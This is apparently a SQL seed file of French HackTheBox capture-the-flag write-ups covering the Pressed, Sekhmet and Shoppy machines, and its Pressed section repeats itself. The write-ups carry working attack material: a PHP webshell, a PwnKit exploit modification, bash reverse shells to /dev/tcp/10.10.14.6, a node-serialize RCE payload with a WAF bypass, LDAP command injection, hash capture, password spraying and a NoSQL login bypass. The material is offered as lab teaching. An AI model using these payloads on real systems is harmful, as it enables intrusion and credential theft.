Je tente d''utiliser ces identifiants sur `/wp-login.php`. Le mot de passe de 2021 échoue, mais une simple itération logique sur l''année (`uhc-jan-finals-2022`) me permet de valider la première étape de l''authentification. Cependant, un **2FA (Two-Factor Authentication)** bloque l''accès au **Dashboard**.

Pour contourner cette restriction, je me tourne vers **XML-RPC**. Cette interface permet d''interagir avec **WordPress** via des requêtes **HTTP POST** en **XML**, contournant souvent les protections de l''interface graphique comme le **2FA**.

> **Schéma Mental :**
> Identifiants valides + 2FA (GUI) -> Recherche d''une interface programmable (API/XML-RPC) -> Interaction directe avec les méthodes du CMS -> Bypass de la couche d''authentification multi-facteurs.

Je vérifie les méthodes disponibles :
```bash
curl --data "<methodCall><methodName>system.listMethods</methodName><params></params></methodCall>" http://pressed.htb/xmlrpc.php
```

Parmi les méthodes, `htb.get_flag` me permet de récupérer directement le flag utilisateur, mais mon objectif est d''obtenir une exécution de code.

### Exploitation de PHP Everywhere via XML-RPC

En utilisant la bibliothèque Python `python-wordpress-xmlrpc`, je me connecte en tant qu''**admin** pour inspecter les articles existants.

```python
from wordpress_xmlrpc import Client
from wordpress_xmlrpc.methods import posts

client = Client(''http://pressed.htb/xmlrpc.php'', ''admin'', ''uhc-jan-finals-2022'')
plist = client.call(posts.GetPosts())
print(plist[0].content)
```

L''inspection du contenu révèle l''utilisation du plugin **PHP Everywhere**. Ce plugin permet d''exécuter du code PHP directement à l''intérieur des blocs de contenu via un paramètre `code` encodé en **Base64**.

```html
<!-- wp:php-everywhere-block/php {"code":"JTNDJTNGcGhwJTIwJTIwZWNobyhmaWxlX2dldF9jb250ZW50cygnJTJGdmFyJTJGd3d3JTJGaHRtbCUyRm91dHB1dC5sb2cnKSklM0IlMjAlM0YlM0U=","version":"3.0.0"} /-->
```

Je prépare un payload PHP pour injecter un **Webshell** qui n''exécutera mes commandes que si elles proviennent de mon adresse IP (pour éviter le détournement par d''autres utilisateurs).

**Payload PHP :**
```php
<?php 
if ($_SERVER[''REMOTE_ADDR''] == ''10.10.14.6'') {
    system($_REQUEST[''cmd'']);
}
?>
```

J''encode ce payload en **Base64**, je modifie l''objet `post` via mon script Python et je le renvoie au serveur via la méthode `EditPost`.

```python
mod_post = plist[0]
mod_post.content = ''... <!-- wp:php-everywhere-block/php {"code":"[BASE64_PAYLOAD]", "version":"3.0.0"} /--> ...''
client.call(posts.EditPost(mod_post.id, mod_post))
```

### Premier Shell (Webshell)

Le **Firewall** de la machine bloque tout le trafic sortant (**Egress Filtering**), rendant impossible l''obtention d''un **Reverse Shell** classique. Je dois donc interagir avec la machine via mon **Webshell** persistant sur l''URL de l''article.

Pour faciliter l''interaction, je crée un wrapper en **Bash** :

```bash
#!/bin/bash
# webshell.sh
curl -d "cmd=$1" -s ''http://pressed.htb/index.php/2022/01/28/hello-world/'' | \
awk ''/<\/table>/{flag=1;next}/<p><\/p>/{flag=0}flag'' | \
sed ''s/&#8211;/--/g'' | head -n -3
```

Je vérifie mon accès :
```bash
./webshell.sh ''id''
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Je dispose désormais d''une **Remote Code Execution (RCE)** stable en tant que `www-data`.

---

### Énumération Post-Exploitation & Analyse des Restrictions

Une fois l''accès **Webshell** établi en tant que `www-data`, ma priorité est de stabiliser l''accès. Cependant, je constate rapidement une restriction majeure : un **Egress Filtering** (filtrage de sortie) agressif. Toutes les tentatives de **Reverse Shell** via `nc`, `bash` ou `python` échouent, et même le protocole **ICMP** (`ping`) est bloqué vers l''extérieur.

#### Vérification de l''environnement
Je commence par énumérer les vecteurs d''escalade locaux classiques. Le système d''exploitation semble être un **Ubuntu 20.04**. Je vérifie la présence du binaire `pkexec` pour une éventuelle exploitation de **PwnKit**.

```bash
# Vérification de la version/date de pkexec
ls -l /usr/bin/pkexec
# Sortie : -rwsr-xr-x 1 root root 31032 Jul 14  2021 /usr/bin/pkexec
```

> **Schéma Mental :** La date de modification (juillet 2021) est antérieure à la divulgation publique de **CVE-2021-4034** (janvier 2022). Puisque le binaire possède le bit **SUID** et n''a pas été patché, la machine est vulnérable à une **Local Privilege Escalation (LPE)** via **PwnKit**.

---

### Escalade de Privilèges : Exploitation de PwnKit (CVE-2021-4034)

L''absence de shell interactif m''oblige à modifier l''exploit **PwnKit** standard. Habituellement, cet exploit invoque `/bin/bash`. Ici, je dois le transformer en un "one-liner" capable d''exécuter une commande spécifique et de retourner le résultat via le **Webshell**.

#### 1. Modification du Payload C
Je modifie la fonction `gconv_init()` dans le code source de l''exploit pour qu''elle exécute mes commandes avec les privilèges **root**.

```c
// pkwner.c (extrait modifié)
void gconv_init() {
  setuid(0); setgid(0);
  seteuid(0); setegid(0);
  system("PATH=/bin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin; id; cat /root/root.txt");
  exit(0);
}
```

#### 2. Transfert via XML-RPC
Pour uploader l''exploit sur la machine cible, j''utilise l''interface **XML-RPC** de WordPress, car elle permet de téléverser des fichiers de manière programmatique via la méthode `wp.uploadFile`.

```python
# Script Python pour l''upload via XML-RPC
from wordpress_xmlrpc import Client
from wordpress_xmlrpc.methods import media

client = Client(''http://pressed.htb/xmlrpc.php'', ''admin'', ''uhc-jan-finals-2022'')

with open(''pkwner.sh'', ''rb'') as f:
    data = {
        ''name'': ''pkwner.png'', # Bypass d''extension
        ''bits'': f.read(),
        ''type'': ''image/png''
    }
client.call(media.UploadFile(data))
```

> **Schéma Mental :** Le filtre de WordPress refuse l''extension `.sh`. En renommant le fichier en `.png` tout en conservant le contenu texte (script bash), je contourne la vérification du **MIME Type** côté applicatif. Le serveur stocke le fichier dans `/wp-content/uploads/`, où il reste exécutable via l''interpréteur `bash`.

#### 3. Exécution et Root Flag
J''exécute le script via mon **Webshell** pour déclencher la vulnérabilité **PwnKit**.

```bash
# Commande envoyée via le paramètre ?cmd=
bash /var/www/html/wp-content/uploads/2022/02/pkwner.png
```

---

### Mouvement Latéral & Évasion du Firewall

Bien que j''aie récupéré le **Root Flag**, l''absence de shell interactif limite mes capacités de post-exploitation. Pour obtenir un véritable **Root Shell**, je dois désactiver ou modifier les règles du **Firewall** (iptables) qui bloquent le trafic sortant.

#### Manipulation d''iptables
En tant que **root** (via l''exploit précédent), je peux injecter des règles **iptables** pour autoriser ma machine d''attaque (10.10.14.6).

```bash
# Autoriser le trafic TCP entrant et sortant pour l''IP de l''attaquant
iptables -A OUTPUT -p tcp -d 10.10.14.6 -j ACCEPT
iptables -A INPUT -p tcp -s 10.10.14.6 -j ACCEPT
```

#### Stabilisation du Shell
Une fois les règles appliquées, je peux enfin lancer un **Reverse Shell** classique vers mon listener `nc`.

```bash
# Sur la machine d''attaque
nc -lvnp 4444

# Via le Webshell (en utilisant l''exploit PwnKit pour les droits root)
bash -i >& /dev/tcp/10.10.14.6/4444 0>&1
```

> **Schéma Mental :** L''attaque se décompose en trois phases : 
> 1. **Abus de confiance** (XML-RPC pour l''upload).
> 2. **Élévation de privilèges** (PwnKit via Webshell).
> 3. **Reconfiguration réseau** (Iptables) pour briser l''isolement de la machine et établir une persistance interactive.

---

### Éviction des restrictions et Élévation de Privilèges

Une fois mon accès **webshell** établi en tant que `www-data`, je constate rapidement une isolation réseau sévère. Toutes mes tentatives de **Reverse Shell** échouent, et même un simple `ping` vers mon instance est bloqué. Le serveur semble filtrer tout l''**Outbound Traffic**.

#### Énumération de la vulnérabilité PwnKit
Compte tenu de la date de sortie de la machine et des tendances habituelles, je vérifie la présence de **PwnKit** (**CVE-2021-4034**). Je contrôle les permissions et la date de modification du binaire `pkexec` :

```bash
ls -l /usr/bin/pkexec
# Sortie : -rwsr-xr-x 1 root root 31032 Jul 14 2021 /usr/bin/pkexec
```

Le binaire est **SUID** et n''a pas été mis à jour depuis juillet 2021, ce qui confirme qu''il est vulnérable sur cette version d''Ubuntu.

> Schéma Mental :
> Webshell (www-data) -> Firewall (Bloque Reverse Shell) -> Exploitation locale (PrivEsc) -> Exécution de commande Root via Webshell -> Modification des règles Firewall -> Accès interactif Root.

#### Exploitation de CVE-2021-4034 via XML-RPC
Comme je ne peux pas interagir avec un shell TTY, je dois modifier un exploit **PwnKit** existant pour qu''il exécute des commandes de manière non-interactive. Je modifie la fonction `gconv_init()` dans le code source C de l''exploit pour qu''elle exécute ma commande cible au lieu de `/bin/bash`.

Pour uploader l''exploit, j''utilise l''interface **XML-RPC** de WordPress avec la méthode `wp.uploadFile`. WordPress refusant les fichiers `.sh`, je contourne la restriction en renommant mon script en `pkwner.png`.

```python
# Snippet Python pour l''upload via XML-RPC
from wordpress_xmlrpc.methods import media
with open(''pkwner.sh'', ''r'') as f:
    script = f.read()
data = { ''name'': ''pkwner.png'', ''bits'': script, ''type'': ''image/png'' }
client.call(media.UploadFile(data))
```

Une fois le fichier uploadé dans `/wp-content/uploads/`, je l''exécute via mon **webshell** :

```bash
./webshell.sh ''bash /var/www/html/wp-content/uploads/2022/02/pkwner.png''
```

L''exploit compile un module partagé malveillant, l''injecte via `pkexec` en manipulant les variables d''environnement (**GCONV_PATH**), et exécute la commande avec les privilèges **root**.

### Beyond Root : Analyse Post-Exploitation

L''analyse du système après l''obtention du flag révèle la raison de l''échec des **Reverse Shells** : une configuration stricte d''**iptables**. Le serveur est configuré pour rejeter tout trafic sortant non explicitement autorisé, une pratique de **Hardening** efficace contre les **Webshells** classiques.

#### Désactivation du Firewall
Pour obtenir un shell interactif stable et sortir de la contrainte du **webshell**, je dois "percer" le firewall en ajoutant des règles autorisant mon IP spécifique :

```bash
# Autoriser le trafic entrant et sortant pour l''IP de l''attaquant
iptables -A OUTPUT -p tcp -d 10.10.14.6 -j ACCEPT
iptables -A INPUT -p tcp -s 10.10.14.6 -j ACCEPT
```

#### Persistence et Analyse
L''utilisation de **PHP Everywhere** comme vecteur d''entrée souligne un risque majeur : l''installation de plugins permettant l''exécution de code (**RCE by design**) au sein d''un CMS. Même avec un **2FA** sur l''interface d''administration, l''activation de **XML-RPC** a permis de contourner cette protection pour modifier le contenu des posts et injecter le **webshell**. 

En environnement de production, la remédiation aurait consisté à :
1. Désactiver totalement **XML-RPC** via `.htaccess`.
2. Supprimer le plugin **PHP Everywhere**.
3. Appliquer les patchs de sécurité Linux pour corriger la vulnérabilité **PwnKit**.
4. Maintenir la politique **Egress Filtering** (bloquant le trafic sortant) tout en surveillant les modifications de règles **iptables**.',
  'HackTheBox',
  'Easy',
  20,
  ARRAY['WordPress', 'Backdoor'],
  'Ma phase de reconnaissance commence par un scan **Nmap** exhaustif pour identifier les ports ouverts et les services associés.',
  true,
  now()
) ON CONFLICT (slug) DO UPDATE SET
  title = EXCLUDED.title,
  content = EXCLUDED.content,
  platform = EXCLUDED.platform,
  difficulty = EXCLUDED.difficulty,
  points = EXCLUDED.points,
  tags = EXCLUDED.tags,
  description = EXCLUDED.description;

-- Writeup: Sekhmet
INSERT INTO writeups (title, slug, content, platform, difficulty, points, tags, description, published, created_at)
VALUES (
  'HackTheBox: Sekhmet',
  'hackthebox-sekhmet',
  '<div class="kali-header">
  <div class="difficulty">Difficulté: Medium</div>
  <div class="points">Points: 30</div>
  <div class="os">OS: Linux</div>
</div>


# Phase 1 : Reconnaissance & Brèche Initiale

### Énumération et Scanning

Je débute par un scan **Nmap** agressif pour identifier les surfaces d''attaque. Bien que la machine soit étiquetée comme Windows sur HTB, les premiers résultats pointent vers un environnement hybride ou conteneurisé.

```bash
# Scan rapide de tous les ports
nmap -p- --min-rate 10000 10.10.11.179

# Scan de services sur les ports découverts
nmap -p 22,80 -sCV 10.10.11.179
```

Le scan révèle :
*   **Port 22 (SSH)** : OpenSSH 8.4p1 (Debian).
*   **Port 80 (HTTP)** : Nginx 1.18.0. Le titre renvoie un **403 Forbidden**, suggérant un **Virtual Hosting**.

### Découverte de sous-domaines

L''accès direct à l''IP redirige vers `www.windcorp.htb`. J''utilise **ffuf** pour découvrir d''autres sous-domaines potentiels en manipulant le header `Host`.

```bash
ffuf -u http://10.10.11.179 -H "Host: FUZZ.windcorp.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -ac -mc all
```

Le fuzzing identifie immédiatement **portal.windcorp.htb**. J''ajoute les entrées à mon fichier `/etc/hosts`.

### Analyse du portail Web

Le site `portal.windcorp.htb` présente une mire de connexion. Une tentative avec des identifiants par défaut (**admin:admin**) me permet d''accéder à l''interface. L''analyse des headers HTTP révèle l''utilisation du framework **Express** (Node.js).

Lors de l''authentification, l''application définit un cookie nommé `profile`.

```http
Set-Cookie: profile=eyJ1c2VybmFtZSI6ImFkbWluIiwiYWRtaW4iOiIxIiwibG9nb24iOjE2ODAwMjM5Nzc1NzF9; Max-Age=604800; HttpOnly
```

Le décodage **Base64** du cookie donne un objet JSON :
`{"username":"admin","admin":"1","logon":1680023977571}`

### Vecteur d''attaque : JSON Deserialization

La présence d''un objet JSON sérialisé dans un cookie sur une application **ExpressJS** est un indicateur fort d''une vulnérabilité de **Insecure Deserialization**. Si l''application utilise la fonction `unserialize()` du module `node-serialize`, il est possible d''exécuter du code arbitraire en utilisant l''identifiant de fonction `_$$ND_FUNC$$_`.

> **Schéma Mental : Deserialization to RCE**
> 1. **Input** : L''attaquant fournit un cookie Base64 contenant un objet JSON malveillant.
> 2. **Trigger** : L''application appelle `unserialize(cookie)`.
> 3. **Execution** : Le préfixe `_$$ND_FUNC$$_` force le moteur JavaScript à évaluer la fonction immédiatement lors de la désérialisation.
> 4. **Payload** : Utilisation de `require(''child_process'').exec()` pour sortir du contexte applicatif.

### Bypass du WAF (ModSecurity)

Une tentative d''injection directe est bloquée par un **WAF (ModSecurity)**, renvoyant une erreur **403 Forbidden**. Le WAF semble détecter les signatures classiques comme `_$$ND_FUNC$$_` ou `function()`.

Pour contourner ces filtres, j''utilise l''encodage **Unicode** pour masquer les caractères spéciaux (`$` devient `\u0024` et `{` devient `\u007b`).

**Payload de test (Ping) :**
```json
{
"rce":"_$$ND_FUNC\u0024$_function() \u007brequire(''child_process'').exec(''ping -c 1 10.10.14.6'', function(error,stdout,stderr) {console.log(stdout) });\n}()"
}
```

Après encodage en **Base64** et injection dans le cookie, je reçois une requête ICMP sur mon interface `tun0`, confirmant la **RCE**.

### Obtention du premier Shell

Je remplace le ping par un **Reverse Shell** classique en Bash.

**Payload final :**
```json
{
"rce":"_$$ND_FUNC\u0024$_function() \u007brequire(''child_process'').exec(''bash -c \"bash -i >& /dev/tcp/10.10.14.6/443 0>&1\"'', function(error,stdout,stderr) {console.log(stdout) });\n}()"
}
```

```bash
# Sur ma machine d''attaque
nc -lnvp 443
```

L''exécution réussit et je récupère un shell en tant que l''utilisateur **webster**. L''environnement est un conteneur ou une VM Linux Debian, bien que la cible finale soit Windows.

```bash
# Stabilisation du shell
script /dev/null -c bash
# CTRL+Z
stty raw -echo; fg
reset
export TERM=xterm
```

---

### Énumération Interne & Mouvement Latéral

Une fois le pied posé sur la machine **webserver** (une VM Linux Debian 11), mon objectif est de sortir de ce conteneur/VM pour atteindre l''infrastructure **Active Directory** sous-jacente.

#### 1. Énumération Post-Exploitation (Linux)

L''énumération du système de fichiers révèle un fichier intéressant dans le répertoire personnel de l''utilisateur `webster` : `backup.zip`. L''analyse des métadonnées montre que l''archive utilise l''algorithme de chiffrement obsolète **ZipCrypto**.

```bash
# Analyse des méthodes de chiffrement de l''archive
7z l -slt backup.zip | grep -E "Path|Method"
# Vérification du CRC32 pour une attaque à texte clair connu
python3 -c "import binascii; print(hex(binascii.crc32(open(''/etc/passwd'',''rb'').read()) & 0xffffffff))"
```

L''archive contient `/etc/passwd`, un fichier dont je possède déjà le contenu en clair sur le système. Cela rend l''archive vulnérable à une **Known Plaintext Attack**.

> **Schéma Mental : Attaque ZipCrypto**
> 1. **Cible** : Archive chiffrée avec l''algorithme ZipCrypto (Stream Cipher).
> 2. **Condition** : Posséder au moins 12 octets du texte clair d''un fichier présent dans l''archive (ici `/etc/passwd`).
> 3. **Action** : Utiliser `bkcrack` pour déduire les clés internes du chiffrement sans casser le mot de passe lui-même.
> 4. **Résultat** : Déchiffrement de l''intégralité de l''archive.

#### 2. Escalade de Privilèges : De Webster à Root

Grâce à `bkcrack`, je récupère les fichiers de configuration de **SSSD** (System Security Services Daemon), qui gère l''authentification AD sur cette machine Linux.

```bash
# Extraction des clés et déchiffrement
bkcrack -C backup.zip -c etc/passwd -P plain.zip -p passwd
bkcrack -C backup.zip -k [KEYS] -U decrypted.zip pass
```

Dans les fichiers extraits, j''accède à la base de données locale de SSSD : `/var/lib/sss/db/cache_windcorp.htb.ldb`. Cette base contient des **hashes de mots de passe mis en cache** pour les utilisateurs du domaine s''étant connectés à la VM.

```bash
# Extraction du hash SHA512-crypt de Ray.Duncan
tdbdump cache_windcorp.htb.ldb | grep -i "cachedPassword"
# Cracking avec Hashcat (Mode 1800)
hashcat -m 1800 ray_hash.txt /usr/share/wordlists/rockyou.txt
```

Le mot de passe de `Ray.Duncan` est `pantera`. Ce dernier dispose de privilèges sudo via Kerberos (**ksu**), me permettant de devenir **root** sur la VM Linux.

#### 3. Pivot vers l''Active Directory

Depuis la VM, j''identifie le **Domain Controller** (DC) : `hope.windcorp.htb` (192.168.0.2). Pour interagir avec le domaine depuis ma machine d''attaque, j''établis un **SOCKS Tunnel** via SSH et configure Kerberos localement.

```bash
# Tunneling SSH et redirection de port pour SMB
ssh -i id_rsa root@10.10.11.179 -D 1080 -R 0.0.0.0:445:127.0.0.1:445
# Configuration Kerberos (/etc/krb5.conf)
# [realms] WINDCORP.HTB = { kdc = hope.windcorp.htb }
proxychains kinit ray.duncan
```

L''énumération des partages SMB révèle un partage non standard : `WC-Share`. Il contient un fichier `debug-users.txt` qui semble être mis à jour dynamiquement.

#### 4. Mouvement Latéral : Injection de Commandes LDAP

L''analyse d''un script PowerShell trouvé dans `NETLOGON` (`form.ps1`) suggère que les attributs LDAP des utilisateurs, notamment le champ **mobile**, sont utilisés pour générer des rapports ou des fichiers de debug.

> **Schéma Mental : Injection via Attribut LDAP**
> 1. **Vecteur** : Un script côté serveur (DC) lit l''attribut `mobile` des utilisateurs AD via une requête LDAP.
> 2. **Vulnérabilité** : Le script concatène cette valeur dans une commande système sans assainissement.
> 3. **Exploitation** : Modifier mon propre attribut `mobile` (ou celui de Ray.Duncan) pour y injecter une commande.
> 4. **Déclencheur** : Attendre l''exécution de la tâche planifiée sur le DC.

J''utilise `ldapmodify` pour injecter une commande visant à capturer un hash **Net-NTLMv2**.

```bash
# Modification de l''attribut mobile pour forcer une connexion SMB
echo -e "dn: CN=RAY DUNCAN,OU=DEVELOPMENT,DC=WINDCORP,DC=HTB\nchangetype: modify\nreplace: mobile\nmobile: \$(net use \\\\webserver.windcorp.htb\\df)" | ldapmodify -H ldap://hope.windcorp.htb
```

En recevant la connexion sur mon relais via le tunnel SSH, je capture le hash de l''utilisateur `scriptrunner`. Après cracking, j''obtiens le mot de passe : `!@p%i&J#iNNo1T2`.

#### 5. Password Spraying & Accès Bob.Wood

Le compte `scriptrunner` est limité. Cependant, dans un environnement AD, les mots de passe de service ou de scripts sont parfois réutilisés. Je procède à un **Password Spraying** sur l''ensemble des utilisateurs du domaine récupérés via LDAP.

```bash
# Récupération de la liste des utilisateurs
ldapsearch -H ldap://hope.windcorp.htb -b "DC=WINDCORP,DC=HTB" sAMAccountName | grep sAMAccountName | awk ''{print $2}'' > users.txt
# Password Spraying avec Kerbrute
./kerbrute passwordspray -d windcorp.htb users.txt ''!@p%i&J#iNNo1T2''
```

Le spray révèle que l''utilisateur **Bob.Wood** utilise le même mot de passe. Bob.Wood fait partie du groupe **IT**, ce qui lui donne un accès **WinRM** sur le Domain Controller.

```bash
# Connexion initiale au DC
evil-winrm -i hope.windcorp.htb -u Bob.Wood -p ''!@p%i&J#iNNo1T2''
```

---

### Élévation de Privilèges sur la VM Linux (webserver)

Une fois l''accès initial obtenu en tant que **webster**, l''énumération locale révèle un fichier `backup.zip` dans le répertoire personnel. L''analyse des métadonnées via `7z l -slt` confirme que l''archive utilise l''algorithme de chiffrement obsolète **ZipCrypto**.

#### Attaque par Texte Clair Connu (Known Plaintext Attack)

Puisque `/etc/passwd` est présent dans l''archive et que son **CRC32** (`D00EEE74`) correspond exactement au fichier `/etc/passwd` actuel du système, une attaque avec **bkcrack** est possible.

> **Schéma Mental :**
> Archive chiffrée (ZipCrypto) + Fichier connu en clair (/etc/passwd) -> Récupération des clés internes -> Déchiffrement de l''archive sans le mot de passe original.

```bash
# Génération de l''archive de référence
zip plain.zip /etc/passwd

# Attaque pour récupérer les clés ZipCrypto
bkcrack -C backup.zip -c etc/passwd -P plain.zip -p passwd

# Extraction des fichiers avec les clés trouvées
bkcrack -C backup.zip -k d6829d8d 8514ff97 afc3f825 -U decrypted.zip pass
```

#### Analyse du cache SSSD & Root

L''archive contient une copie de `/var/lib/sss/db/`, incluant la base de données **LDB** de **SSSD** (`cache_windcorp.htb.ldb`). Ce fichier stocke les credentials des utilisateurs du domaine s''étant connectés à la machine.

```bash
# Extraction du hash SHA512-crypt de l''utilisateur Ray.Duncan
tdbdump cache_windcorp.htb.ldb | grep cachedPassword
# Hash : $6$nHb338EAa7BAeuR0$MFQjz2.B688LXEDsx035...
# Crack via Hashcat (m 1800) : pantera
```

Avec les identifiants de `Ray.Duncan`, j''utilise **ksu** (**Kerberos SU**) pour obtenir les privilèges **root**. **ksu** s''appuie sur le ticket Kerberos pour autoriser le changement d''identité vers **root**.

```bash
kinit ray.duncan
ksu
# Authenticated ray.duncan@WINDCORP.HTB -> Root access granted
```

---

### Compromission du Domaine (Pivot Windows)

En tant que **root**, j''énumère le **Domain Controller** (`hope.windcorp.htb`). Un partage SMB nommé `WC-Share` contient un fichier `debug-users.txt` mis à jour dynamiquement.

#### Injection de Commande via Attribut LDAP

L''analyse suggère qu''un script côté serveur (Windows) récupère l''attribut `mobile` des utilisateurs AD pour générer ce fichier. En modifiant mon propre attribut `mobile` via `ldapmodify`, je peux tester une **Command Injection**.

> **Schéma Mental :**
> Modification Attribut LDAP (Linux) -> Script de synchronisation (Windows) -> Exécution de commande avec les privilèges du compte de service.

```bash
# Injection pour identifier l''utilisateur exécutant le script
echo -e ''dn: CN=RAY DUNCAN,OU=DEVELOPMENT,DC=WINDCORP,DC=HTB\nchangetype: modify\nreplace: mobile\nmobile: $(whoami)'' | ldapmodify -H ldap://hope.windcorp.htb

# Résultat dans debug-users.txt : windcorp\scriptrunner
```

#### Capture de Hash via SSH Remote Port Forwarding

Pour récupérer le hash de `scriptrunner`, je force une connexion SMB vers ma machine. Comme le flux direct est bloqué, j''utilise un **Remote Tunnel** SSH pour rediriger le port 445 de la VM Linux vers mon instance **Responder** ou **smbserver.py**.

```bash
# Sur ma machine (Kala) : redirection du port 445 distant vers le local
ssh -R 445:127.0.0.1:445 root@10.10.11.179

# Injection LDAP pour déclencher la connexion SMB
# mobile: $(net use \\webserver.windcorp.htb\df)

# Capture du Net-NTLMv2 sur mon hôte
smbserver.py df . -smb2support
# Hash cracké : !@p%i&J#iNNo1T2
```

---

### Domination Totale (Beyond Root)

Le mot de passe de `scriptrunner` est réutilisé par d''autres comptes. Un **Password Spraying** via **kerbrute** identifie l''utilisateur `Bob.Wood`.

```bash
./kerbrute passwordspray -d windcorp.htb domain_users.txt ''!@p%i&J#iNNo1T2''
# [+] VALID LOGIN: Bob.Wood@windcorp.htb
```

`Bob.Wood` a accès au **Domain Controller** via **WinRM**. L''analyse post-exploitation révèle que cet utilisateur utilise Microsoft Edge. Les credentials stockés dans le navigateur sont protégés par **DPAPI** (**Data Protection API**).

#### Analyse Beyond Root : Extraction DPAPI

En utilisant des outils comme **Mimikatz** ou **SharpDPAPI** sur la session de `Bob.Wood`, il est possible d''extraire les **MasterKeys** de l''utilisateur pour déchiffrer les secrets stockés.

1.  **Extraction de la MasterKey** : Localisée dans `%APPDATA%\Microsoft\Protect\{SID}`.
2.  **Déchiffrement des Login Data d''Edge** : Le fichier SQLite `Login Data` contient les mots de passe chiffrés.
3.  **Compromission Admin** : Les credentials d''un **Domain Admin** sont ainsi récupérés, permettant une compromission totale de la forêt AD.

> **Schéma Mental Final :**
> Password Reuse -> WinRM Access -> DPAPI Post-Exploitation -> Edge Credential Decryption -> Domain Admin.',
  'HackTheBox',
  'Medium',
  30,
  ARRAY['Node.js', 'Deserialization', 'ModSecurity', 'WAF Bypass'],
  'Je débute par un scan **Nmap** agressif pour identifier les surfaces d''attaque. Bien que la machine soit étiquetée comme Windows sur HTB, les premiers résultats pointent vers un environnement hybride ...',
  true,
  now()
) ON CONFLICT (slug) DO UPDATE SET
  title = EXCLUDED.title,
  content = EXCLUDED.content,
  platform = EXCLUDED.platform,
  difficulty = EXCLUDED.difficulty,
  points = EXCLUDED.points,
  tags = EXCLUDED.tags,
  description = EXCLUDED.description;

-- Writeup: Shoppy
INSERT INTO writeups (title, slug, content, platform, difficulty, points, tags, description, published, created_at)
VALUES (
  'HackTheBox: Shoppy',
  'hackthebox-shoppy',
  '<div class="kali-header">
  <div class="difficulty">Difficulté: Easy</div>
  <div class="points">Points: 20</div>
  <div class="os">OS: Linux</div>
</div>


# Phase 1 : Reconnaissance & Brèche Initiale

## 1. Énumération Réseau (Scanning)

Ma méthodologie commence par un scan **Nmap** complet pour identifier la surface d''attaque. Le serveur cible semble être une instance Linux (Debian) hébergeant plusieurs services web.

```bash
# Scan rapide de tous les ports
nmap -p- --min-rate 10000 10.10.11.180

# Scan de version et scripts par défaut sur les ports identifiés
nmap -p 22,80,9093 -sCV 10.10.11.180
```

**Résultats clés :**
*   **Port 22 (SSH)** : OpenSSH 8.4p1.
*   **Port 80 (HTTP)** : Nginx 1.23.1. Redirige vers `http://shoppy.htb`.
*   **Port 9093 (HTTP)** : Service inconnu retournant des métriques (type **Prometheus AlertManager**).

J''ajoute immédiatement l''entrée correspondante dans mon fichier `/etc/hosts` pour résoudre le domaine.

## 2. Énumération Web & Virtual Host Fuzzing

Le site principal sur `shoppy.htb` est une page "Coming Soon". Pour découvrir d''éventuels sous-domaines, j''utilise **wfuzz** en filtrant les réponses par défaut (169 caractères).

```bash
wfuzz -u http://10.10.11.180 -H "Host: FUZZ.shoppy.htb" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt --hh 169
```

Le fuzzing révèle le sous-domaine `mattermost.shoppy.htb`. Je l''ajoute également à mon fichier `/etc/hosts`.

En parallèle, je lance une énumération de répertoires avec **feroxbuster** sur le domaine principal :

```bash
feroxbuster -u http://shoppy.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
```

**Endpoints identifiés :**
*   `/login` : Formulaire d''authentification.
*   `/admin` : Redirige vers `/login`.
*   `/exports` : Répertoire potentiellement sensible.

> **Schéma Mental :** L''absence de fichiers `.php` ou `.html` classiques et le comportement des routes suggèrent une application **Node.js** ou un framework moderne utilisant un moteur de routage dynamique.

## 3. Identification de la vulnérabilité : NoSQL Injection

Lors de mes tests sur le formulaire de login, l''injection de caractères spéciaux comme `''` provoque un **504 Gateway Time-out**. Ce comportement erratique est souvent le signe qu''une requête malformée bloque le backend.

En testant des payloads **NoSQL Injection** (communs sur les stacks Node.js/MongoDB), je tente de manipuler la logique de la requête `$where`.

### Authentification Bypass
Le payload suivant est injecté dans le champ `username` :
`admin'' || ''a''==''a`

```http
POST /login HTTP/1.1
Host: shoppy.htb
Content-Type: application/x-www-form-urlencoded

username=admin'' || ''a''==''a&password=admin
```

**Résultat :** Le serveur répond par un **302 Found** vers `/admin`. La condition `''a''==''a''` étant toujours vraie, la requête MongoDB retourne le premier utilisateur trouvé (l''administrateur) sans vérifier le mot de passe.

> **Schéma Mental :** La vulnérabilité réside dans l''utilisation de données non assainies à l''intérieur d''une clause `$where` ou d''une fonction `eval()` côté base de données. La requête finale ressemble à : `db.users.find({ $where: "this.username == ''admin'' || ''a''==''a'' && this.password == ''...''" })`.

## 4. Exfiltration de données & Pivot Mattermost

Une fois dans le panel `/admin`, j''accède à la fonctionnalité `/admin/search-users`. Cette fonction est également vulnérable à la même **NoSQL Injection**.

En recherchant `admin'' || ''a''==''a`, l''application génère un export JSON contenant tous les utilisateurs de la base de données.

**Données récupérées :**
*   `admin` : Hash MD5 (non crackable immédiatement).
*   `josh` : `josh:orange` (Hash MD5 `08449460...` cracké via **CrackStation**).

### Accès à Mattermost
Je tente ces identifiants sur `mattermost.shoppy.htb`. L''accès est validé pour l''utilisateur **josh**.
En explorant les canaux de discussion :
1.  Dans **#Development**, Josh mentionne un gestionnaire de mots de passe en C++.
2.  Dans **#Deploy Machine**, je trouve une conversation privée entre **Josh** et **Jaeger** contenant des identifiants de déploiement.

**Credentials trouvés :** `jaeger:Sh0ppyBest@pp!`

## 5. Premier Shell (Foothold)

Les identifiants récupérés sur Mattermost sont testés via **SSH**.

```bash
ssh jaeger@shoppy.htb
# Password: Sh0ppyBest@pp!
```

L''accès est réussi. Je récupère le premier flag dans `/home/jaeger/user.txt`. L''énumération locale révèle que l''application tourne dans `/home/jaeger/ShoppyApp`, confirmant mes soupçons sur la stack **Node.js**.

---

### Énumération Interne & Mouvement Latéral

Une fois l''accès initial obtenu via **SSH** avec le compte **jaeger**, l''objectif est d''identifier les vecteurs d''escalade de privilèges vers un utilisateur plus privilégié ou vers le compte **root**.

#### 1. Énumération du compte jaeger

L''énumération standard commence par la vérification des droits **sudo** et l''inspection des fichiers appartenant à d''autres utilisateurs.

```bash
# Vérification des privilèges sudo
sudo -l

# Résultat :
# User jaeger may run the following commands on shoppy:
#    (deploy) /home/deploy/password-manager
```

